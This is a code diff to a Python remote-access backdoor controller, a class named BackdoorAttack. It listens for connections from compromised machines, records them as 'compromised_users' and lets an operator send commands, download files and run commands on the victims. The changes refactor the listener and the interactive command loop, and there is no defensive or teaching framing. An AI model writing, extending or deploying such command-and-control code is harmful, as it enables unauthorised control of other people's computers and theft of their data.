@@ -75,14 +75,14 @@ class BackdoorAttack:
     * Example Call:   attack = BackdoorAttack("192.168.1.11", 2000)
     """
     def __init__(self, ip, port):
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind(("", port))
-        listener.listen(0)
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind(("", port))
+        self.listener.listen(0)
 
-        self.connection, self.address = listener.accept()
+        self.connection, self.address = self.listener.accept()
         
-        BackdoorAttack.compromised_users[self.address[0]] = "IP: {} | ".format(self.address[0]) + self.receive_data()
+        BackdoorAttack.compromised_users[self.address[0]] = "IP: {} | {}".format(self.address[0], self.receive_data())
         BackdoorAttack.compromised_sys_count += 1
 
     """ 
@@ -192,18 +192,20 @@ class BackdoorAttack:
     """
     def communicate(self):
         print("\nAttacking {}...\nEnter 'quit' to terminate connection / 'back' to return to main menu.".format(self.address[0]))
-
-        run = 1       
-        while run:
+     
+        while True:
             command = input("\n>> ").split(" ")
 
             if(command[0] == "back"):
-                run = 0
+                print("\nReturning back to main menu...\n")
+                return "back"
 
             elif(command[0] == "quit"):
-                run = 0
                 result = self.execute_on_sys(command)
                 self.close_connection()
+
+                print("\nReturning back to main menu...\n")
+                return "quit"
                 
             elif(command[0] == "download"):
                 data = self.execute_on_sys(command)
@@ -231,7 +233,6 @@ class BackdoorAttack:
                 result = self.execute_on_sys(command)
                 print("\n{}\n".format(result))
 
-        print("\nReturning back to main menu...\n")
 
 """ 
 * Function Name:  create_listener()
@@ -273,7 +274,10 @@ if __name__ == "__main__":
 
                     if(option != "q"):
                         if(option in (str(i) for i in range(1, len(BackdoorAttack.compromised_users)+1))):
-                            obj_list[int(option)-1].communicate()
+                            action = obj_list[int(option)-1].communicate()
+
+                            if(action == "quit"):
+                                obj_list.pop(int(option)-1)
 
                             if(BackdoorAttack.compromised_sys_count == 0):
                                 print_waiting = 1
